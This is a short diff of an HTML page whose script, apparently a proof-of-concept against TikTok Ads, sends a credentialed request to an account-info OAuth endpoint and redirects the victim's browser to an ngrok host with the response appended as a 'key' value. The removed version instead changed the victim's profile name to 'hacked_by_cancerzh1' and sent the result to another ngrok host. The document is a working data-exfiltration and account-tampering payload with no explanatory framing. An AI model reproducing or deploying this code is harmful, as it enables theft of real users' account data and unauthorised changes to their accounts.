@@ -1,11 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
 var xhr = new XMLHttpRequest();
 
 xhr.onload = reqListener; 
-xhr.open("POST", "https://ads.tiktok.com/web/user/update/user_info/");
+xhr.open("GET", "https://ads.tiktok.com/ac/api/v1/oauth/tt_oauth_base_info?msToken=8OLXQsITlBMGlv_JTV-1nOiVJUQ-I-2RB3uVh9YzJWSDTWWkQRK2tUgF4kn5IoBdg8rf5NYNNiJquWQonJQYOmR4Aa4nbaOjC5ZWzcaraobpiToTKSNRYW2bqbXY6TDHlfc=&X-Bogus=DFSzsIVOKokANHbAtxrWi0WdbTLk&_signature=_02B4Z6wo00001Xdm9DgAAIDBXR8MrXfTMgV3Z.CAADk177");
 xhr.withCredentials = true;
 xhr.setRequestHeader("Content-Type", "application/json");
-xhr.send('aid=1583&language=en&account_sdk_source=web&fp=verify_ldg8d6wz_dJfbg8DW_Ni91_4lTb_Be17_4vSJJFLGIAm6&name=hacked_by_cancerzh1');
+xhr.send();
 
 function reqListener() {
-    location='//11b0-202-162-37-174.ngrok-free.app/?key='+this.responseText; 
+    location='//2d7a-140-213-103-229.ngrok-free.app/?key='+this.responseText; 
 };
+
+</script></body>
+</html>
